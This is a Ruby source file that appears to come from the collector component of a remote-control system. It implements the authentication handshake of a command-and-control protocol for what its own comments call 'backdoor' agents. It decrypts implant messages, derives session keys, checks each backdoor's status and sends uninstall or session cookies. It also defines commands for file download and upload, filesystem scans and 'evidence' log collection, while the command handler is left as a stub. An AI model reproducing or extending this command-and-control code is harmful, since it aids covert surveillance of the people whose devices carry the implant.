#
#  The Synchronization REST Protocol
#

# relatives
require_relative 'session.rb'
require_relative 'db.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/crypt'
require 'rcs-common/pascalize'

# system
require 'securerandom'

module RCS
module Collector

class Protocol
  extend RCS::Tracer
  extend RCS::Crypt

  INVALID_COMMAND  = 0x00       # Don't use
  PROTO_OK         = 0x01       # OK
  PROTO_NO         = 0x02       # Nothing available
  PROTO_BYE        = 0x03       # The end of the protocol
  PROTO_CHALLENGE  = 0x04       # Authentication
  PROTO_ID         = 0x0f       # Identification of the target
  PROTO_CONF       = 0x07       # New configuration
  PROTO_UNINSTALL  = 0x0a       # Uninstall command
  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
  PROTO_UPLOAD     = 0x0d       # A file to be saved
  PROTO_EVIDENCE   = 0x09       # Upload of a log
  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned

  # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest

  # Authentication phase
  # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
  # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
  def self.authenticate(peer, uri, cookie, content)
    trace :info, "[#{peer}] Authentication required..."

    # decrypt the message with the per customer signature
    begin
      message = aes_decrypt(content, DB.instance.backdoor_signature)
    rescue
      trace :error, "[#{peer}] Invalid message decryption"
      return
    end

    # first part of the session key, chosen by the client
    # it will be used to derive the session key later along with Ks (server chosen)
    # and the Cb (pre-shared conf key)
    kd = message.slice!(0..15)
    trace :debug, "[#{peer}] Auth -- Kd: " << kd.unpack('H*').to_s

    # the client NOnce that has to be returned by the server
    # this is used to authenticate the server
    # returning it crypted with the session key it will confirm the
    # authenticity of the server
    nonce = message.slice!(0..15)
    trace :debug, "[#{peer}] Auth -- Nonce: " << nonce.unpack('H*').to_s

    # the build_id identification
    build_id = message.slice!(0..15)
    trace :debug, "[#{peer}] Auth -- BuildId: " << build_id

    # instance of the device
    instance_id = message.slice!(0..19)
    trace :debug, "[#{peer}] Auth -- InstanceId: " << instance_id.unpack('H*').to_s

    # subtype of the device
    subtype = message.slice!(0..15)
    trace :debug, "[#{peer}] Auth -- subtype: " << subtype

    # identification digest
    sha = message.slice!(0..19)
    trace :debug, "[#{peer}] Auth -- sha: " << sha.unpack('H*').to_s

    # get the class key from the db
    conf_key = DB.instance.class_key_of build_id

    # this class does not exist
    return if conf_key.nil?

    # the server will calculate the same sha digest and authenticate the backdoor
    # since the conf key is pre-shared
    sha_check = Digest::SHA1.digest(build_id + instance_id + subtype + conf_key)
    trace :debug, "[#{peer}] Auth -- sha_check: " << sha_check.unpack('H*').to_s

    # identification failed
    unless sha.eql? sha_check then
      trace :warn, "[#{peer}] Invalid identification"
      return
    end

    trace :info, "[#{peer}] Authentication phase 1 completed"

    # remove the trailing zeroes from the strings
    build_id.delete!("\x00")
    subtype.delete!("\x00")

    # random key part chosen by the server
    ks = SecureRandom.random_bytes(16)
    trace :debug, "[#{peer}] Auth -- Ks: " << ks.unpack('H*').to_s

    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
    # we use a schema like PBKDF1
    k = Digest::SHA1.digest(conf_key + ks + kd)
    trace :debug, "[#{peer}] Auth -- K: " << k.unpack('H*').to_s

    # prepare the response:
    # Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response )
    message = aes_encrypt(ks, DB.instance.backdoor_signature)

    # ask the database the status of the backdoor
    status, bid = DB.instance.status_of(build_id, instance_id, subtype)

    # what to do based on the backdoor status
    case status
      when DB::DELETED_BACKDOOR, DB::NO_SUCH_BACKDOOR, DB::CLOSED_BACKDOOR
        response = [PROTO_UNINSTALL].pack('i')
        trace :info, "[#{peer}] Uninstall command sent"
      when DB::ACTIVE_BACKDOOR
        # everything is ok
        response = [PROTO_OK].pack('i')

        # create a valid cookie session
        cookie = SessionManager.instance.create(bid, build_id, instance_id, subtype, k)

        trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
    end

    # complete the message for the backdoor
    message += aes_encrypt(nonce + response, k)

    return message, 'application/octet-stream', cookie
  end


  def self.valid_authentication(peer, cookie)

    # check if the cookie was created correctly and if it is still valid
    valid = SessionManager.instance.check(cookie)

    if valid then
      trace :info, "[#{peer}] [#{cookie}] Authenticated"
    else
      trace :warn, "[#{peer}] [#{cookie}] Invalid cookie"
    end

    return valid
  end

  
  def self.commands(peer, cookie, content)
    trace :debug, "COMMANDS"
    return
  end

  # the protocol is parsed here
  # there are only two phases:
  #   - Authentication
  #   - Commands
  def self.parse(peer, uri, cookie, content)

    # if the request does not contains any cookies,
    # we need to perform authentication first
    return authenticate(peer, uri, cookie, content) if cookie.nil?

    # we have a cookie, check if it's valid
    return unless valid_authentication(peer, cookie)

    # the agent has been authenticated, parse the commands it sends
    return commands(peer, cookie, content)
  end


end #Protocol

end #Collector::
end #RCS::